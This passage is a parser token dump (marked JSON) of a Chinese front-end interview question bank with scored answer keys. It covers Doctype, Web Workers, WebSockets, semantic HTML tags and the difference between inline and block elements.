级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","task":false,"loose":false,"text":"**1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","tokens":[{"type":"text","raw":"**1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","text":"**1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","text":"  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 15. HTML5 中的Web Worker是什么？\\n\\n","depth":2,"text":"15. HTML5 中的Web Worker是什么？","tokens":[{"type":"text","raw":"15. HTML5 中的Web Worker是什么？","text":"15. HTML5 中的Web Worker是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 基本概念：\\n  + 运行在后台的JavaScript\\n  + 独立于主线程\\n  + 不会阻塞页面渲染\\n\\n- **1：** 主要特点：\\n  + 多线程执行\\n  + 消息通信机制\\n  + 独立的运行环境\\n\\n- **1：** 使用限制：\\n  + 无法访问DOM\\n  + 无法访问window对象\\n  + 无法访问document对象\\n  + 有同源限制\\n\\n- **1：** 适用场景：\\n  + 复杂数据处理\\n  + 大量计算\\n  + 图像处理\\n  + 数据加密","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 基本概念：\\n  + 运行在后台的JavaScript\\n  + 独立于主线程\\n  + 不会阻塞页面渲染\\n\\n","task":false,"loose":true,"text":"**1：** 基本概念：\\n+ 运行在后台的JavaScript\\n+ 独立于主线程\\n+ 不会阻塞页面渲染\\n","tokens":[{"type":"text","raw":"**1：** 基本概念：\\n","text":"**1：** 基本概念：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 基本概念：","text":" 基本概念：","escaped":false}]},{"type":"list","raw":"+ 运行在后台的JavaScript\\n+ 独立于主线程\\n+ 不会阻塞页面渲染\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 运行在后台的JavaScript\\n","task":false,"loose":false,"text":"运行在后台的JavaScript","tokens":[{"type":"text","raw":"运行在后台的JavaScript","text":"运行在后台的JavaScript","tokens":[{"type":"text","raw":"运行在后台的JavaScript","text":"运行在后台的JavaScript","escaped":false}]}]},{"type":"list_item","raw":"+ 独立于主线程\\n","task":false,"loose":false,"text":"独立于主线程","tokens":[{"type":"text","raw":"独立于主线程","text":"独立于主线程","tokens":[{"type":"text","raw":"独立于主线程","text":"独立于主线程","escaped":false}]}]},{"type":"list_item","raw":"+ 不会阻塞页面渲染","task":false,"loose":false,"text":"不会阻塞页面渲染","tokens":[{"type":"text","raw":"不会阻塞页面渲染","text":"不会阻塞页面渲染","tokens":[{"type":"text","raw":"不会阻塞页面渲染","text":"不会阻塞页面渲染","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 主要特点：\\n  + 多线程执行\\n  + 消息通信机制\\n  + 独立的运行环境\\n\\n","task":false,"loose":true,"text":"**1：** 主要特点：\\n+ 多线程执行\\n+ 消息通信机制\\n+ 独立的运行环境\\n","tokens":[{"type":"text","raw":"**1：** 主要特点：\\n","text":"**1：** 主要特点：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 主要特点：","text":" 主要特点：","escaped":false}]},{"type":"list","raw":"+ 多线程执行\\n+ 消息通信机制\\n+ 独立的运行环境\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 多线程执行\\n","task":false,"loose":false,"text":"多线程执行","tokens":[{"type":"text","raw":"多线程执行","text":"多线程执行","tokens":[{"type":"text","raw":"多线程执行","text":"多线程执行","escaped":false}]}]},{"type":"list_item","raw":"+ 消息通信机制\\n","task":false,"loose":false,"text":"消息通信机制","tokens":[{"type":"text","raw":"消息通信机制","text":"消息通信机制","tokens":[{"type":"text","raw":"消息通信机制","text":"消息通信机制","escaped":false}]}]},{"type":"list_item","raw":"+ 独立的运行环境","task":false,"loose":false,"text":"独立的运行环境","tokens":[{"type":"text","raw":"独立的运行环境","text":"独立的运行环境","tokens":[{"type":"text","raw":"独立的运行环境","text":"独立的运行环境","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用限制：\\n  + 无法访问DOM\\n  + 无法访问window对象\\n  + 无法访问document对象\\n  + 有同源限制\\n\\n","task":false,"loose":true,"text":"**1：** 使用限制：\\n+ 无法访问DOM\\n+ 无法访问window对象\\n+ 无法访问document对象\\n+ 有同源限制\\n","tokens":[{"type":"text","raw":"**1：** 使用限制：\\n","text":"**1：** 使用限制：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用限制：","text":" 使用限制：","escaped":false}]},{"type":"list","raw":"+ 无法访问DOM\\n+ 无法访问window对象\\n+ 无法访问document对象\\n+ 有同源限制\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 无法访问DOM\\n","task":false,"loose":false,"text":"无法访问DOM","tokens":[{"type":"text","raw":"无法访问DOM","text":"无法访问DOM","tokens":[{"type":"text","raw":"无法访问DOM","text":"无法访问DOM","escaped":false}]}]},{"type":"list_item","raw":"+ 无法访问window对象\\n","task":false,"loose":false,"text":"无法访问window对象","tokens":[{"type":"text","raw":"无法访问window对象","text":"无法访问window对象","tokens":[{"type":"text","raw":"无法访问window对象","text":"无法访问window对象","escaped":false}]}]},{"type":"list_item","raw":"+ 无法访问document对象\\n","task":false,"loose":false,"text":"无法访问document对象","tokens":[{"type":"text","raw":"无法访问document对象","text":"无法访问document对象","tokens":[{"type":"text","raw":"无法访问document对象","text":"无法访问document对象","escaped":false}]}]},{"type":"list_item","raw":"+ 有同源限制","task":false,"loose":false,"text":"有同源限制","tokens":[{"type":"text","raw":"有同源限制","text":"有同源限制","tokens":[{"type":"text","raw":"有同源限制","text":"有同源限制","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 适用场景：\\n  + 复杂数据处理\\n  + 大量计算\\n  + 图像处理\\n  + 数据加密","task":false,"loose":true,"text":"**1：** 适用场景：\\n+ 复杂数据处理\\n+ 大量计算\\n+ 图像处理\\n+ 数据加密","tokens":[{"type":"text","raw":"**1：** 适用场景：\\n","text":"**1：** 适用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 适用场景：","text":" 适用场景：","escaped":false}]},{"type":"list","raw":"+ 复杂数据处理\\n+ 大量计算\\n+ 图像处理\\n+ 数据加密","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 复杂数据处理\\n","task":false,"loose":false,"text":"复杂数据处理","tokens":[{"type":"text","raw":"复杂数据处理","text":"复杂数据处理","tokens":[{"type":"text","raw":"复杂数据处理","text":"复杂数据处理","escaped":false}]}]},{"type":"list_item","raw":"+ 大量计算\\n","task":false,"loose":false,"text":"大量计算","tokens":[{"type":"text","raw":"大量计算","text":"大量计算","tokens":[{"type":"text","raw":"大量计算","text":"大量计算","escaped":false}]}]},{"type":"list_item","raw":"+ 图像处理\\n","task":false,"loose":false,"text":"图像处理","tokens":[{"type":"text","raw":"图像处理","text":"图像处理","tokens":[{"type":"text","raw":"图像处理","text":"图像处理","escaped":false}]}]},{"type":"list_item","raw":"+ 数据加密","task":false,"loose":false,"text":"数据加密","tokens":[{"type":"text","raw":"数据加密","text":"数据加密","tokens":[{"type":"text","raw":"数据加密","text":"数据加密","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 16. HTML5 中的WebSocket是什么？\\n\\n","depth":2,"text":"16. HTML5 中的WebSocket是什么？","tokens":[{"type":"text","raw":"16. HTML5 中的WebSocket是什么？","text":"16. HTML5 中的WebSocket是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 基本概念：\\n  + 基于TCP的全双工通信协议\\n  + 服务器可以主动推送数据\\n  + 建立在HTTP协议之上\\n  + 使用ws://或wss://作为协议前缀\\n\\n- **1：** 主要特点：\\n  + 持久连接\\n  + 全双工通信\\n  + 数据格式轻量\\n  + 更好的实时性\\n\\n- **1：** 与HTTP的区别：\\n  + 不需要频繁建立连接\\n  + 服务器可以主动推送\\n  + 更低的通信开销\\n  + 无同源限制\\n\\n- **1：** 应用场景：\\n  + 实时聊天\\n  + 游戏通信\\n  + 实时数据展示\\n  + 协同编辑","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 基本概念：\\n  + 基于TCP的全双工通信协议\\n  + 服务器可以主动推送数据\\n  + 建立在HTTP协议之上\\n  + 使用ws://或wss://作为协议前缀\\n\\n","task":false,"loose":true,"text":"**1：** 基本概念：\\n+ 基于TCP的全双工通信协议\\n+ 服务器可以主动推送数据\\n+ 建立在HTTP协议之上\\n+ 使用ws://或wss://作为协议前缀\\n","tokens":[{"type":"text","raw":"**1：** 基本概念：\\n","text":"**1：** 基本概念：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 基本概念：","text":" 基本概念：","escaped":false}]},{"type":"list","raw":"+ 基于TCP的全双工通信协议\\n+ 服务器可以主动推送数据\\n+ 建立在HTTP协议之上\\n+ 使用ws://或wss://作为协议前缀\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 基于TCP的全双工通信协议\\n","task":false,"loose":false,"text":"基于TCP的全双工通信协议","tokens":[{"type":"text","raw":"基于TCP的全双工通信协议","text":"基于TCP的全双工通信协议","tokens":[{"type":"text","raw":"基于TCP的全双工通信协议","text":"基于TCP的全双工通信协议","escaped":false}]}]},{"type":"list_item","raw":"+ 服务器可以主动推送数据\\n","task":false,"loose":false,"text":"服务器可以主动推送数据","tokens":[{"type":"text","raw":"服务器可以主动推送数据","text":"服务器可以主动推送数据","tokens":[{"type":"text","raw":"服务器可以主动推送数据","text":"服务器可以主动推送数据","escaped":false}]}]},{"type":"list_item","raw":"+ 建立在HTTP协议之上\\n","task":false,"loose":false,"text":"建立在HTTP协议之上","tokens":[{"type":"text","raw":"建立在HTTP协议之上","text":"建立在HTTP协议之上","tokens":[{"type":"text","raw":"建立在HTTP协议之上","text":"建立在HTTP协议之上","escaped":false}]}]},{"type":"list_item","raw":"+ 使用ws://或wss://作为协议前缀","task":false,"loose":false,"text":"使用ws://或wss://作为协议前缀","tokens":[{"type":"text","raw":"使用ws://或wss://作为协议前缀","text":"使用ws://或wss://作为协议前缀","tokens":[{"type":"text","raw":"使用ws://或wss://作为协议前缀","text":"使用ws://或wss://作为协议前缀","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 主要特点：\\n  + 持久连接\\n  + 全双工通信\\n  + 数据格式轻量\\n  + 更好的实时性\\n\\n","task":false,"loose":true,"text":"**1：** 主要特点：\\n+ 持久连接\\n+ 全双工通信\\n+ 数据格式轻量\\n+ 更好的实时性\\n","tokens":[{"type":"text","raw":"**1：** 主要特点：\\n","text":"**1：** 主要特点：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 主要特点：","text":" 主要特点：","escaped":false}]},{"type":"list","raw":"+ 持久连接\\n+ 全双工通信\\n+ 数据格式轻量\\n+ 更好的实时性\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 持久连接\\n","task":false,"loose":false,"text":"持久连接","tokens":[{"type":"text","raw":"持久连接","text":"持久连接","tokens":[{"type":"text","raw":"持久连接","text":"持久连接","escaped":false}]}]},{"type":"list_item","raw":"+ 全双工通信\\n","task":false,"loose":false,"text":"全双工通信","tokens":[{"type":"text","raw":"全双工通信","text":"全双工通信","tokens":[{"type":"text","raw":"全双工通信","text":"全双工通信","escaped":false}]}]},{"type":"list_item","raw":"+ 数据格式轻量\\n","task":false,"loose":false,"text":"数据格式轻量","tokens":[{"type":"text","raw":"数据格式轻量","text":"数据格式轻量","tokens":[{"type":"text","raw":"数据格式轻量","text":"数据格式轻量","escaped":false}]}]},{"type":"list_item","raw":"+ 更好的实时性","task":false,"loose":false,"text":"更好的实时性","tokens":[{"type":"text","raw":"更好的实时性","text":"更好的实时性","tokens":[{"type":"text","raw":"更好的实时性","text":"更好的实时性","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 与HTTP的区别：\\n  + 不需要频繁建立连接\\n  + 服务器可以主动推送\\n  + 更低的通信开销\\n  + 无同源限制\\n\\n","task":false,"loose":true,"text":"**1：** 与HTTP的区别：\\n+ 不需要频繁建立连接\\n+ 服务器可以主动推送\\n+ 更低的通信开销\\n+ 无同源限制\\n","tokens":[{"type":"text","raw":"**1：** 与HTTP的区别：\\n","text":"**1：** 与HTTP的区别：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 与HTTP的区别：","text":" 与HTTP的区别：","escaped":false}]},{"type":"list","raw":"+ 不需要频繁建立连接\\n+ 服务器可以主动推送\\n+ 更低的通信开销\\n+ 无同源限制\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 不需要频繁建立连接\\n","task":false,"loose":false,"text":"不需要频繁建立连接","tokens":[{"type":"text","raw":"不需要频繁建立连接","text":"不需要频繁建立连接","tokens":[{"type":"text","raw":"不需要频繁建立连接","text":"不需要频繁建立连接","escaped":false}]}]},{"type":"list_item","raw":"+ 服务器可以主动推送\\n","task":false,"loose":false,"text":"服务器可以主动推送","tokens":[{"type":"text","raw":"服务器可以主动推送","text":"服务器可以主动推送","tokens":[{"type":"text","raw":"服务器可以主动推送","text":"服务器可以主动推送","escaped":false}]}]},{"type":"list_item","raw":"+ 更低的通信开销\\n","task":false,"loose":false,"text":"更低的通信开销","tokens":[{"type":"text","raw":"更低的通信开销","text":"更低的通信开销","tokens":[{"type":"text","raw":"更低的通信开销","text":"更低的通信开销","escaped":false}]}]},{"type":"list_item","raw":"+ 无同源限制","task":false,"loose":false,"text":"无同源限制","tokens":[{"type":"text","raw":"无同源限制","text":"无同源限制","tokens":[{"type":"text","raw":"无同源限制","text":"无同源限制","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 应用场景：\\n  + 实时聊天\\n  + 游戏通信\\n  + 实时数据展示\\n  + 协同编辑","task":false,"loose":true,"text":"**1：** 应用场景：\\n+ 实时聊天\\n+ 游戏通信\\n+ 实时数据展示\\n+ 协同编辑","tokens":[{"type":"text","raw":"**1：** 应用场景：\\n","text":"**1：** 应用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 应用场景：","text":" 应用场景：","escaped":false}]},{"type":"list","raw":"+ 实时聊天\\n+ 游戏通信\\n+ 实时数据展示\\n+ 协同编辑","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 实时聊天\\n","task":false,"loose":false,"text":"实时聊天","tokens":[{"type":"text","raw":"实时聊天","text":"实时聊天","tokens":[{"type":"text","raw":"实时聊天","text":"实时聊天","escaped":false}]}]},{"type":"list_item","raw":"+ 游戏通信\\n","task":false,"loose":false,"text":"游戏通信","tokens":[{"type":"text","raw":"游戏通信","text":"游戏通信","tokens":[{"type":"text","raw":"游戏通信","text":"游戏通信","escaped":false}]}]},{"type":"list_item","raw":"+ 实时数据展示\\n","task":false,"loose":false,"text":"实时数据展示","tokens":[{"type":"text","raw":"实时数据展示","text":"实时数据展示","tokens":[{"type":"text","raw":"实时数据展示","text":"实时数据展示","escaped":false}]}]},{"type":"list_item","raw":"+ 协同编辑","task":false,"loose":false,"text":"协同编辑","tokens":[{"type":"text","raw":"协同编辑","text":"协同编辑","tokens":[{"type":"text","raw":"协同编辑","text":"协同编辑","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 17. 请简述header、footer、nav、article、section这些语义化标签的作用及使用场景\\n\\n","depth":2,"text":"17. 请简述header、footer、nav、article、section这些语义化标签的作用及使用场景","tokens":[{"type":"text","raw":"17. 请简述header、footer、nav、article、section这些语义化标签的作用及使用场景","text":"17. 请简述header、footer、nav、article、section这些语义化标签的作用及使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。\\n- **1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。\\n- **1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。\\n- **1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。\\n- **1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。\\n","task":false,"loose":false,"text":"**1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","tokens":[{"type":"text","raw":"**1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","text":"**1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","text":"  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。\\n","task":false,"loose":false,"text":"**1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","tokens":[{"type":"text","raw":"**1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","text":"**1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","text":"  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。\\n","task":false,"loose":false,"text":"**1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","tokens":[{"type":"text","raw":"**1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","text":"**1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","text":"  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。\\n","task":false,"loose":false,"text":"**1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","tokens":[{"type":"text","raw":"**1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","text":"**1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","text":"  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","task":false,"loose":false,"text":"**1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","tokens":[{"type":"text","raw":"**1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","text":"**1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","text":"  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 18. 行内元素和块级元素的区别是什么\\n\\n","depth":2,"text":"18. 行内元素和块级元素的区别是什么","tokens":[{"type":"text","raw":"18. 行内元素和块级元素的区别是什么","text":"18. 行内元素和块级元素的区别是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：**  布局方面：块级元素会独占一行，默认情况下宽度会填满父容器，如`<div>、<p>、<h1>`等；行内元素不会独占一行，在一行内可以多个行\\n内元素并排显示，如`<span>、<a>、<img>`等。\\n- **1：**  尺寸方面：块级元素可以设置宽度、高度、上下内外边距等属性，能通过 CSS 自由控制其大小和位置；行内元素默认宽度和高度由内容决定，一般\\n不能直接设置宽度和高度，垂直方向的内外边距设置可能会有部分效果，但不如块级元素明显。\\n- **1：**  